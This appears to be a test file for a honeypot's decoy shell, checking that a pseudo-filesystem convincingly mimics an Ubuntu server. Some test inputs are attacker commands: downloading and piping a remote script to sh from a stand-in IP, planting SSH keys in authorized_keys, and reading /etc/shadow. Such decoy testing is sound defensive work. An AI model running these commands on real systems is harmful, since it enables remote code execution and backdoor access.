"""Pseudo-filesystem realism: standard commands and files behave like stock Ubuntu 22.04."""
from src.decoy.pseudo_fs import PseudoFilesystem


def run(fs, cmd):
    return fs.execute_command(cmd)[0]


def test_system_files_are_realistic():
    fs = PseudoFilesystem("s")
    assert run(fs, "cat /etc/passwd").startswith("root:x:0:0:root:/root:/bin/bash\n")
    assert 'PRETTY_NAME="Ubuntu 22.04.4 LTS"' in run(fs, "cat /etc/os-release")
    assert run(fs, "cat /proc/cpuinfo").count("processor") == 2
    assert run(fs, "cat /etc") == "cat: /etc: Is a directory\n"
    assert "Permission denied" in run(fs, "cat /etc/shadow")
    assert "Automatically generated" not in run(fs, "cat /etc/hostname")


def test_basic_commands_exist_and_agree():
    fs = PseudoFilesystem("s", username="admin")
    assert run(fs, "echo ok") == "ok\n"
    assert run(fs, "whoami") == "admin\n"
    assert run(fs, "id").startswith("uid=1000(admin)")
    assert run(fs, "hostname") == "srv-prod-01\n"
    assert run(fs, "nproc") == "2\n"
    assert "Mem:" in run(fs, "free -m")
    assert run(fs, "which python3") == "/usr/bin/python3\n"
    assert "echo ok" in run(fs, "history")
    assert run(fs, "sudo whoami") == "admin\n"


def test_uname_options():
    fs = PseudoFilesystem("s")
    assert run(fs, "uname") == "Linux\n"
    assert run(fs, "uname -m") == "x86_64\n"
    assert run(fs, "uname -r") == "5.15.0-105-generic\n"
    assert run(fs, "uname -a").startswith("Linux srv-prod-01 5.15.0-105-generic")
    # nproc / cpuinfo / uname all describe the same machine
    assert run(fs, "hostname").strip() in run(fs, "uname -a")


def test_directories_are_consistent():
    fs = PseudoFilesystem("s", username="root")
    assert fs.cwd == "/root"
    assert run(fs, "ls") == ""  # only dotfiles in /root
    assert ".ssh" in run(fs, "ls -la")
    assert run(fs, "ls /etc") != run(fs, "ls /var")
    assert "No such file or directory" in run(fs, "cd /nonexistent")
    assert fs.cwd == "/root"
    assert "cannot access" in run(fs, "ls /nope")


def test_chained_commands_and_downloads_update_state():
    fs = PseudoFilesystem("s")
    out = run(fs, "cd /tmp; wget http://198.51.100.7/x.sh && chmod +x x.sh")
    assert fs.cwd == "/tmp"
    assert "saved" in out
    assert run(fs, "ls") == "x.sh\n"
    run(fs, "rm x.sh")
    assert run(fs, "ls") == ""


def test_pipes_and_redirects():
    fs = PseudoFilesystem("s", username="root")
    assert run(fs, "ps aux | grep sshd | wc -l").strip() == "2"
    assert run(fs, "ps aux | grep -v root | head -n 1").startswith("USER")
    assert run(fs, "curl http://198.51.100.7/x.sh | sh") == ""  # piped script never runs anywhere
    # a dropped SSH key is readable afterwards, appends accumulate, /dev/null swallows output
    run(fs, 'echo "ssh-rsa AAAA key1" > ~/.ssh/authorized_keys')
    run(fs, 'echo "ssh-rsa BBBB key2" >> ~/.ssh/authorized_keys')
    assert run(fs, "cat ~/.ssh/authorized_keys") == "ssh-rsa AAAA key1\nssh-rsa BBBB key2\n"
    assert run(fs, "cat /nonexistent 2>/dev/null > /dev/null") == ""
    run(fs, "cd /tmp && echo hi > a.txt")
    assert run(fs, "ls") == "a.txt\n" and run(fs, "cat a.txt") == "hi\n"
    run(fs, "rm a.txt")
    assert run(fs, "ls") == ""


def test_status_commands_are_consistent():
    fs = PseudoFilesystem("s", username="admin")
    ps = run(fs, "ps aux")
    assert "PID" in ps and "mysqld" in ps and "admin" in ps
    assert run(fs, "ps").splitlines()[1].endswith("bash")
    assert "ps -ef" not in run(fs, "ps -ef | grep -c bash")  # filter ran, no raw dump
    listening = run(fs, "netstat -tulpn")
    assert ":22 " in listening and "sshd" in listening and "3306" in listening
    assert "10.0.0.55" in run(fs, "ifconfig") and "10.0.0.55" in run(fs, "ip a")
    assert "/dev/nvme0n1p1" in run(fs, "df -h")
    assert "load average" in run(fs, "uptime")
    assert run(fs, "crontab -l") == "no crontab for admin\n"
    assert run(fs, "pstree") == "bash: pstree: command not found\n"  # no substring matching on 'ps'
